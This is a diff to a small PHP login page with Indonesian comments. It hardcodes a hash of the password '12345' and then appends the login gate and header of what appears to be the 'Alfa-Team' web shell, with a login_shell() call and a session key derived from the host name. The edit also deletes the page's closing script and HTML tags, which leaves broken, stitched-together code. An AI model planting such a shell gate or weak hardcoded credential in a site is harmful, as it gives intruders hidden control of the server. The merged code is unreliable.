@@ -1,9 +1,10 @@
 <?php
 session_start();
 
-// Simpan hash password yang aman (gunakan password_hash saat pertama kali menyimpan password)
-define("PASSWORD_HASH", password_hash("12345", PASSWORD_DEFAULT));
+// Gunakan password hash yang tetap untuk perbandingan
+const PASSWORD_HASH = '$2y$10$eImiTXuWVxfM37uY4JANjQhZrjlCy4ZOWW0G5JZ6P9Mb/mQa3/.XW'; // Hash dari "12345"
 
+// Cek jika form login dikirimkan
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     if (!empty($_POST['password']) && password_verify($_POST['password'], PASSWORD_HASH)) {
         $_SESSION['loggedin'] = true;
@@ -57,13 +58,20 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         if (this.value.length >= 5) {
             this.form.submit();
         }
-    });
-</script>
-
-</body>
-</html>
 
 <?php
+
+    exit;
+}
+if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
+    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+        header("refresh: 0;");
+    } else {
+        login_shell();
+    }
+}
+
 /*
 	Author: 	Solevisible/Alfa-Team
 	Telegram: 	https://telegram.me/solevisible
